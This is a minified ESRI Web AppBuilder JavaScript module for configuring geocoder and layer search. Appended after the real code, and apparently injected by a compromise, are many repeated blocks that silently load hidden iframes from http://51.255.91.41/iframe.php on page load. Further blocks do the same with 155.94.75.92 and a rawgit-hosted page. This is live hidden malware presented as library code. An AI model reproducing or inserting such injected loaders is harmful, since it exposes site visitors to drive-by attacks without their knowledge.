// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/lang dojo/_base/array dojo/Deferred dojo/when dojo/promise/all jimu/portalUtils esri/lang esri/request".split(" "),function(e,g,n,p,h,q,k,r){return{map:null,layerInfosObj:null,appConfig:null,_esriLocatorRegExp:/geocode(.){0,3}\.arcgis.com\/arcgis\/rest\/services\/World\/GeocodeServer/g,setMap:function(a){this.map=a},setLayerInfosObj:function(a){this.layerInfosObj=a},setAppConfig:function(a){this.appConfig=a},getConfigInfo:function(a){if(a&&a.sources&&0<a.sources.length){var b=null;
return this.searchLayer(this.map)&&a.upgradeFromGeocoder?(b=this.map.itemInfo.itemData.applicationProperties.viewing.search,b=g.map(b.layers,e.hitch(this,function(a,b){b.hintText=a;return this._getQueryTypeGeocoder(b)},b.hintText)),h(b).then(e.hitch(this,function(c){a.sources=[].concat(c).concat(a.sources);return a}))):a}return p(this._getSourcesFromPortalAndWebmap()).then(e.hitch(this,function(a){return{allPlaceholder:"",showInfoWindowOnSelect:!0,sources:a}}))},_getSourcesFromPortalAndWebmap:function(){var a=
[],b=null;this.searchLayer(this.map)&&(b=this.map.itemInfo.itemData.applicationProperties.viewing.search,g.forEach(b.layers,e.hitch(this,function(b,l){l.hintText=b;a.push(this._getQueryTypeGeocoder(l))},b.hintText)));return q.getPortalSelfInfo(this.appConfig.portalUrl).then(e.hitch(this,function(b){if((b=b.helperServices&&b.helperServices.geocode)&&0<b.length)for(var c=0,f=b.length;c<f;c++){var m=b[c];m&&a.push(this._processSingleLine(m))}return h(a).then(e.hitch(this,function(a){for(var b=[],c=0;c<
a.length;c++){var d=a[c];d&&(d&&"query"===d.type||(d={name:d.name||this._getGeocodeName(d.url),url:d.url,singleLineFieldName:d.singleLineFieldName,placeholder:d.placeholder||d.name||this._getGeocodeName(d.url),maxResults:6,searchInCurrentMapExtent:!1,type:"locator"},d.enableLocalSearch=this._isEsriLocator(d.url),d.localSearchMinScale=3E5,d.localSearchDistance=5E4),b.push(d))}return b}))}))},_getQueryTypeGeocoder:function(a){var b=this.map.getLayer(a.id),c=null,e=null,f=null,f=k.isDefined(a.subLayer)?
a.id+"_"+a.subLayer:a.id,c=this.layerInfosObj.traversal(function(a){return a.id===f?(e=a,!0):!1});return b&&c&&e?(c=k.isDefined(a.subLayer)?e.url||b.url+"/"+a.subLayer:e.url||b.url,{name:e.title,layerId:f,url:c,placeholder:a.hintText,searchFields:[a.field.name],displayField:a.field.name,exactMatch:a.field.exactMatch||!1,maxResults:6,searchInCurrentMapExtent:!1,type:"query"}):null},_isEsriLocator:function(a){this._esriLocatorRegExp.lastIndex=0;return this._esriLocatorRegExp.test(a)},_processSingleLine:function(a){if(a.singleLineFieldName)return a;
if(this._isEsriLocator(a.url))return a.singleLineFieldName="SingleLine",a;var b=new n;r({url:a.url,content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(e.hitch(this,function(c){c.singleLineAddressField&&c.singleLineAddressField.name?(a.singleLineFieldName=c.singleLineAddressField.name,b.resolve(a)):(console.warn(a.url+"has no singleLineFieldName"),b.resolve(null))}),e.hitch(this,function(a){console.error(a);b.resolve(null)}));return b.promise},_getGeocodeName:function(a){if("string"!==
typeof a)return"geocoder";a=a.split("/");return a[a.length-2]||"geocoder"},getGeocoderName:function(a){return this._getGeocodeName(a)},hasAppSearchInfo:function(a){return a.itemInfo&&a.itemInfo.itemData&&a.itemInfo.itemData.applicationProperties&&a.itemInfo.itemData.applicationProperties.viewing&&a.itemInfo.itemData.applicationProperties.viewing.search},searchLayer:function(a){if(!this.hasAppSearchInfo(a))return!1;a=a.itemInfo.itemData.applicationProperties.viewing.search;return a.enabled&&0!==a.layers.length?
!0:!1}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});